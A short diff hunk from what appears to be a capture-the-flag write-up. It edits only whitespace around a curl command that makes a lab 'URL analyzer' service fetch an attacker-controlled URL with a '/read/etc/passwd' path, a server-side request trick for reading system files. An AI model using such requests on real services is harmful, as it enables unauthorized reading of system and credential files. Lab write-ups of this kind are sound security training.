@@ -71,7 +71,6 @@ This is dangerous for several reasons:
 The room's malicious backend (likely a Flask server) was set up with a `/read/` endpoint that performs file operations. Testing with curl revealed:
 ```bash
 curl -s -X POST (http://url-analyzer.hopaitech.thm/analyze)   -H "Content-Type: application/json"   -d '{"url":"http://YOUR-VPN-IP:8888/read/etc/passwd"}' | jq -r '.analysis'
-
 ```
 
 Output:
